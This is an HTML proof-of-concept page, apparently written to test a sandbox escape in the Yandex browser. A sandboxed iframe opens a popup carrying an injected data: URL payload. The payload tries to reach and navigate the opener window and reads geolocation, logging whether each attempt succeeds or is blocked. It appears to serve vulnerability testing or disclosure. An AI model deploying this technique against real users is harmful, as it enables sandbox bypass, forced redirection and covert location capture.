<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Yandex Sandbox Escape PoC</title>
<style>
body { font-family: sans-serif; padding: 16px; }
.log { background: #111; color: #0f0; padding: 10px; font-family: monospace; border-radius: 8px; white-space: pre-wrap; }
button { padding: 8px 14px; border-radius: 6px; cursor: pointer; }
</style>
</head>
<body>
<h1>Yandex Sandbox Escape PoC</h1>
<p>Click karte hi iframe ke andar se popup open hoga taaki block na ho.</p>

<h3>Logs:</h3>
<div id="log" class="log"></div>

<!-- Sandboxed iframe -->
<iframe id="sbx" sandbox="allow-scripts allow-popups" style="width:100%;height:200px;border:1px solid #ccc;"
srcdoc="
<!DOCTYPE html>
<html>
<body>
<h3>Iframe: Click niche button to test</h3>
<button onclick='runTest()'>Open Popup</button>
<div id=log style=\\"font-family:monospace;white-space:pre-wrap;background:#000;color:#0f0;padding:6px;\\"></div>

<script>
function log(x){ document.getElementById('log').textContent += x + '\\n'; try{ parent.postMessage({type:'log', msg:x}, '*'); }catch(e){} }

function runTest(){
    log('Iframe: Opening about:blank popup...');
    var w = window.open('about:blank', '_blank');
    if(!w){ log('Iframe: Popup blocked or sandbox prevented opening'); return; }

    log('Iframe: Popup opened, injecting payload...');
    var payload = \`<!DOCTYPE html><html><body>
        <h2>Aux Window</h2>
        <div id=out></div>
        <script>
        function p(m){
            document.getElementById('out').innerHTML += m+'<br>';
            try{ opener.postMessage({type:'fromAux', msg:m}, '*'); }catch(e){}
        }
        p('Opener access: '+(!!window.opener));
        try{ opener.location.hash = '#changed'; p('Opener hash change SUCCESS'); }catch(e){ p('Opener hash change BLOCKED: '+e); }
        try{ opener.location = 'https://example.com/#nav'; p('Opener nav attempt SUCCESS'); }catch(e){ p('Opener nav BLOCKED: '+e); }
        try{ if(navigator.geolocation){
            navigator.geolocation.getCurrentPosition(
                pos => p('Geolocation: '+pos.coords.latitude+','+pos.coords.longitude),
                err => p('Geo err: '+err.message)
            );
        }}catch(e){ p('Geo API blocked: '+e); }
        <\/script>
    </body></html>\`;
    w.location = 'data:text/html,' + encodeURIComponent(payload);
}
<\/script>
</body>
</html>
"></iframe>

<script>
const logEl = document.getElementById('log');
function log(m){ logEl.textContent += m + '\n'; }

// Messages from iframe or aux window
window.addEventListener('message', e=>{
    if(e.data.type==='log') log('[IFRAME] ' + e.data.msg);
    if(e.data.type==='fromAux') log('[AUX] ' + e.data.msg);
});
</script>
</body>
</html>
